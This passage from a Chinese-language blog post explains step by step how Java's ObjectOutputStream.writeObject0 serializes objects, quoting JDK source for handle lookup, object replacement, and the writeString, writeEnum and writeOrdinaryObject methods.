：writeObject0"></a>核中核 ：writeObject0</h3><p>writeObject0 比较复杂，大致可分为三个部分：</p><ul><li>一是判断需不需要序列化；</li><li>二是判断是否替换了对象；</li><li>三是终于可以序列化。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Underlying writeObject/writeUnshared implementation.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject0</span><span class="params">(Object obj, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">boolean</span> oldMode = bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">      depth++;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">// handle previously written and non-replaceable objects</span></span><br><span class="line">          <span class="keyword">int</span> h;</span><br><span class="line">          <span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">              writeNull();</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">              writeHandle(h);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">              writeClass((Class) obj, unshared);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">              writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// check for replacement object</span></span><br><span class="line">          Object orig = obj;</span><br><span class="line">          Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">          ObjectStreamClass desc;</span><br><span class="line">          <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">              <span class="comment">// REMIND: skip this check for strings/arrays?</span></span><br><span class="line">              Class&lt;?&gt; repCl;</span><br><span class="line">              desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">              <span class="keyword">if</span> (!desc.hasWriteReplaceMethod() ||</span><br><span class="line">                  (obj = desc.invokeWriteReplace(obj)) == <span class="keyword">null</span> ||</span><br><span class="line">                  (repCl = obj.getClass()) == cl)</span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              cl = repCl;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">              Object rep = replaceObject(obj);</span><br><span class="line">              <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  cl = rep.getClass();</span><br><span class="line">                  desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              obj = rep;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// if object replaced, run through original checks a second time</span></span><br><span class="line">          <span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">              subs.assign(orig, obj);</span><br><span class="line">              <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">                  writeNull();</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                  writeHandle(h);</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                  writeClass((Class) obj, unshared);</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">                  writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// remaining cases</span></span><br><span class="line">          <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">              writeString((String) obj, unshared);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">              writeArray(obj, desc, unshared);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">              writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">              writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(</span><br><span class="line">                      cl.getName() + <span class="string">"\n"</span> + debugInfoStack.toString());</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(cl.getName());</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          depth--;</span><br><span class="line">          bout.setBlockDataMode(oldMode);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先第一步就把bout的块模式关掉了，原始模式赋值给了oldMode。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">boolean</span> oldMode = bout.setBlockDataMode(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>下一句<code>depth++</code>：表示的是对象序列化的深度。</p><blockquote><p>比如说对象A进行了序列化，那么depth++；</p><p>此时如果A中的字段(field)也是一个对象，需要对这个对象再次进行序列化，此时再一次depth++；</p><p>细心的可以发现其实在最后的finally里面配套的有depth–； </p><p>因而如果不出异常则 depth 最终会是 0，有异常则在 catch 模块时 depth 不为 0。</p></blockquote><p>接下来按照三步走的顺序来解析<code>writeObject0</code>做了什么：</p><p><strong>第一步：处理已经处理过的和不可替换的对象</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> h;</span><br><span class="line"><span class="comment">// 1. 替换后的对象为 null</span></span><br><span class="line"><span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="keyword">null</span>) &#123;     </span><br><span class="line">    writeNull();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 2. handles存储的是已经序列化的对象句柄，如果找到了，直接写一个句柄就可以了</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;  </span><br><span class="line">    writeHandle(h);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 3. Class 对象</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">    writeClass((Class) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 4. ObjectStreamClass 序列化类的描述信息</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">    writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>已经处理过的</strong>和<strong>不可替换的</strong>对象，这些都是不能够序列化的，其实在大多数情况下，我们的代码都不会进入第一步代码块。</p><p>首先进入<code>if ((obj = subs.lookup(obj)) == null)</code>这句：</p><img src="../images/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/image-20210715203720012.png" alt="image-20210715203720012" style="zoom:50%;"><p>lookup方法会在subs这个map中当前对象obj是否有可替换(writeReplace)对象，如果没有的话，则返回obj对象本身。</p><p>也就是说，这个方法实际上就是处理以前写入的对象和不可替换的对象。更直白点的意思，这段代码实际上做的是一个检测功能，如果检测到当前传入对象在 替换哈希表(<code>ReplaceTable</code>) 中无法找到，那么就调用<code>writeNull</code>方法。</p><p>下一个if判断是判断当前写入方式是不是“<code>unshared</code>”方式，然后可以看到紧跟着的就是<code>handles.lookup(obj)</code>，跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Looks up and returns handle associated with given object, or -1 if</span></span><br><span class="line"><span class="comment">* no mapping found.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> index = hash(obj) % spine.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = spine[index]; i &gt;= <span class="number">0</span>; i = next[i]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (objs[i] == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法会查找并返回与给定对象关联的<code>handler</code>，如果没有找到映射，则返回 -1；</p><p>直白的意思就是说判断是否在“引用哈希表(<code>HandleTable</code>)”中找到该引用，如果有，那么调用<code>writeHandle</code>方法并且返回；如果没找到，那么返回-1，需要进一步序列化处理。</p><p>接下来判断当前传入对象是不是特殊类型的<code>Class</code>和<code>ObjectStreamClass</code>，如果是，则调用<code>writeClass</code>或<code>writeClassDesc</code>方法并且返回；</p><p><strong>总结1：</strong> <strong>Java 序列化保存了很多与数据无关的数据，如类信息</strong>。但 Java 本身也做了一些优化，如 handles 保存了类的句柄，这样重复的类就只用保存一个句柄就可以了。</p><p><strong>第二步：查找可替换对象是否已经序列化了</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Object orig = obj;</span><br><span class="line">Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">ObjectStreamClass desc;</span><br><span class="line"><span class="comment">// 1. 如果要序列化的对象中有 writeReplace 方法，则递归检查最终要输出的对象</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    Class&lt;?&gt; repCl;</span><br><span class="line">    desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 如果要序列化的对象中有 writeReplace 方法，则递归检查最终要输出的对象</span></span><br><span class="line">    <span class="keyword">if</span> (!desc.hasWriteReplaceMethod() ||</span><br><span class="line">        (obj = desc.invokeWriteReplace(obj)) == <span class="keyword">null</span> ||</span><br><span class="line">        (repCl = obj.getClass()) == cl) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cl = repCl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2. 子类重写 ObjectOutputStream#replaceObject 方法</span></span><br><span class="line"><span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">    Object rep = replaceObject(obj);</span><br><span class="line">    <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">        cl = rep.getClass();</span><br><span class="line">        desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    obj = rep;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 既然要序列化的对象已经被替换了，此时就需要再次做判断，和步骤1类似</span></span><br><span class="line"><span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">    subs.assign(orig, obj);</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        writeNull();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        writeHandle(h);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">        writeClass((Class) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">        writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是一个for无条件循环，重点是<code>desc = ObjectStreamClass.lookup(cl, true);</code> </p><p>这个方法很长，概括一下就是：</p><p><code>ObjectStreamClass.lookup()</code>封装待序列化的类生成类描述符 <em>（返回<code>ObjectStreamClass</code>类型）</em> ，获取包括类名、自定义<code>serialVersionUID</code>、可序列化字段 <em>（返回<code>ObjectStreamField</code>类型）</em> 和构造方法，以及<code>writeObject</code>、<code>readObject</code>方法等</p><p><strong>desc更像是一个类信息模板，需要查找类信息的时候，desc充当句柄。</strong></p><p>一步步看，一开始检查是否开启了<code>enableReplace</code>标志位，通常为false，不会进来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">   Object rep = replaceObject(obj);</span><br><span class="line">   <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">       cl = rep.getClass();</span><br><span class="line">       desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   obj = rep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再往下，如果对象是被替换的，则第二次进行原始检查：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if object replaced, run through original checks a second time</span></span><br><span class="line"><span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">    subs.assign(orig, obj);</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        writeNull();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        writeHandle(h);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">        writeClass((Class) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">        writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果对象被替换，这里会对原始对象进行二次检查，和最开始的那段代码很像，这里先将替换对象插入到<code>subs</code>(替换哈希表)中，然后进行类似的判断。</p><p><strong>第三步：序列化对象</strong></p><p>以上执行都完成过后，会处理剩余对象类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// remaining cases</span></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    writeString((String) obj, unshared);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">    writeArray(obj, desc, unshared);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">    writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">    writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(</span><br><span class="line">            cl.getName() + <span class="string">"\n"</span> + debugInfoStack.toString());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotSerializableException(cl.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Switch-case模式：</p><ul><li>如果对象是String类型，那么调用<code>writeString</code>方法将数据写入字节流；</li><li>如果对象是Array类型，那么调用<code>writeArray</code>方法将数据写入字节流；</li><li>如果对象为Enum类型，调用<code>writeEnum</code>方法将数据写入字节流；</li><li>如果对象实现了<code>Serializable</code>接口，调用<code>writeOrdinaryObject</code>方法将数据写入字节流；</li></ul><p>以上条件都不满足时则抛出<code>NotSerializableException</code>异常信息；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// String 类型</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeString</span><span class="params">(String str, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : str);</span><br><span class="line">    <span class="keyword">long</span> utflen = bout.getUTFLength(str);</span><br><span class="line">    <span class="keyword">if</span> (utflen &lt;= <span class="number">0xFFFF</span>) &#123;     <span class="comment">// 长度小于 0xFFFF(65506)</span></span><br><span class="line">        bout.writeByte(TC_STRING);  <span class="comment">// 类型</span></span><br><span class="line">        bout.writeUTF(str, utflen); <span class="comment">// 内容</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                    <span class="comment">// 长度大于 0xFFFF(65506)</span></span><br><span class="line">        bout.writeByte(TC_LONGSTRING);</span><br><span class="line">        bout.writeLongUTF(str, utflen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Enum 类型</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeEnum</span><span class="params">(Enum&lt;?&gt; en, ObjectStreamClass desc, </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    bout.writeByte(TC_ENUM);                <span class="comment">// 1. 类型</span></span><br><span class="line">    ObjectStreamClass sdesc = desc.getSuperDesc();  <span class="comment">// 2. 类信息</span></span><br><span class="line">    writeClassDesc((sdesc.forClass() == Enum.class) ? desc : sdesc, false);</span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : en);</span><br><span class="line">    writeString(en.name(), <span class="keyword">false</span>);          <span class="comment">// 3. 枚举类的名称</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现了 Serializable 接口的序列化</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeOrdinaryObject</span><span class="params">(Object obj, ObjectStreamClass desc,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;    </span><br><span class="line">    desc.checkSerialize();</span><br><span class="line"></span><br><span class="line">    bout.writeByte(TC_OBJECT);      <span class="comment">// 1. 类型</span></span><br><span class="line">    writeClassDesc(desc, <span class="keyword">false</span>);    <span class="comment">// 2. 类信息</span></span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : obj);</span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">        writeExternalData((Externalizable) obj);    <span class="comment">// 3.1 实现 Externalizable 接口的类</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        writeSerialData(obj, desc); <span class="comment">// 3.2 实现 Serializable 接口的类，数据序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面三个大同小异，panda师傅简单的举例了一下<code>writeString</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeString</span><span class="params">(String str, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    handles.assign(unshared ? <span class="keyword">null</span> : str);</span><br><span class="line">    <span class="keyword">long</span> utflen = bout.getUTFLength(str);</span><br><span class="line">    <span class="keyword">if</span> (utflen &lt;= <span class="number">0xFFFF</span>) &#123;</span><br><span class="line">        bout.writeByte(TC_STRING);</span><br><span class="line">        bout.writeUTF(str, utflen);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        bout.writeByte(TC_LONGSTRING);</span><br><span class="line">        bout.writeLongUTF(str, utflen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在写入String对象之前，代码会判断当前写入方式是否是<code>unshared</code>，如果不是<code>unshared</code>方式还需要在<code>handles</code>这个对象映射表中插入当前String对象；接着，代码会调用<code>getUTFLength</code>函数获取String字符串的长度和<code>0xFFFF</code>比较，如果大于该值时，表示当前String对象是一个长字符串对象，那么会先写入<code>TC_LONGSTRING</code>标记（表示是LONGSTRING类型数据），然后写入字符串的长度和内容；如果小于等于该值时，表示当前String对象就是一个普通的字符串对象，那么会先写入<code>TC_STRING</code>标记（表示是一个STRING类型对象），然后写入字符串的长度和内容。</p><h2 id="writeOrdinaryObject"><a href="#writeOrdinaryObject" class="headerlink" title="writeOrdinaryObject"></a>writeOrdinaryObject</h2><p>终于到了重点分析的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes representation of a "ordinary" (i.e., not a String, Class,</span></span><br><span class="line"><span class="comment"> * ObjectStreamClass, 